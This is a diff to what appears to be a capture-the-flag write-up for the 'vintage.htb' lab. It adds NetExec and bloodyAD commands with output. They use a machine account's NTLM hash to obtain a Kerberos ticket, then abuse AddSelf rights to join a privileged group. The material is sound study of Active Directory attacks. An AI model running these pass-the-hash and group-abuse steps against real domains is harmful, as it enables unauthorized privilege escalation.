@@ -175,6 +175,19 @@ Ive got GenericWrite and AddSelf on the service managers group
 
 # Adding member to `servicemanagers` group
 ```python
+nxc smb dc01.vintage.htb -u 'GMSA01$' -H '0851299c01b944d01099fc977eaa6c67' --generate-tgt gmsa01 -k
+SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\GMSA01$:0851299c01b944d01099fc977eaa6c67 
+SMB         dc01.vintage.htb 445    dc01             [+] TGT saved to: gmsa01.ccache
+SMB         dc01.vintage.htb 445    dc01             [+] Run the following command to use the TGT: export KRB5CCNAME=gmsa01.ccache
+```
+This generated a TGT for the GMSA01$ machine account
+
+```python
+export KRB5CCNAME=gmsa01.ccache
+```
+
+```python
 bloodyAD -k --host dc01.vintage.htb -d vintage.htb add groupMember servicemanagers 'GMSA01$' 
 [+] GMSA01$ added to servicemanagers
 ```
